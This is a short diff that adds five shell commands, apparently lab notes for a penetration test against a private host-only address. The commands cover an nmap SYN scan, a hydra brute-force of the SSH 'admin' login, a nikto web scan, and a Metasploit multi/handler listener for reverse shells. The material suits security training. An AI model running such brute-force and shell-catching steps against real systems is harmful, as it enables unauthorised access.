@@ -1,0 +1,5 @@
+nmap -sS 192.168.56.101
+hydra -l admin -P passwords.txt ssh://192.168.56.101
+nikto -h http://192.168.56.101
+msfconsole
+use exploit/multi/handler
